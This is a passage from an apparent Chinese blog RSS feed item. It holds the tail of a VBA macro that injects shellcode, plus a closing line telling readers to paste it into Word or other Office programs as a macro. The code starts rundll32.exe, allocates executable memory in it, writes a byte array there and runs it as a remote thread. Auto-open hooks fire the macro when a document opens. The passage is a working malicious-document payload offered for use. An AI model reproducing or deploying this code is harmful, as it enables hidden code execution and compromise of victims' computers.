sProc = Environ(&amp;#34;windir&amp;#34;) &amp;amp; &amp;#34;\\System32\\rundll32.exe&amp;#34;&#xD;&#xA;    End If&#xD;&#xA;    res = RunStuff(sNull, sProc, ByVal 0&amp;amp;, ByVal 0&amp;amp;, ByVal 1&amp;amp;, ByVal 4&amp;amp;, ByVal 0&amp;amp;, sNull, sInfo, pInfo)&#xD;&#xA;    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;amp;H1000, &amp;amp;H40)&#xD;&#xA;    For offset = LBound(myArray) To UBound(myArray)&#xD;&#xA;        myByte = myArray(offset)&#xD;&#xA;        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;amp;)&#xD;&#xA;    Next offset&#xD;&#xA;    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)&#xD;&#xA;End Sub&#xD;&#xA;Sub AutoOpen()&#xD;&#xA;    Auto_Open&#xD;&#xA;End Sub&#xD;&#xA;Sub Workbook_Open()&#xD;&#xA;    Auto_Open&#xD;&#xA;End Sub&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将这串代码复制到WORD或者其他office中进行创建宏&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
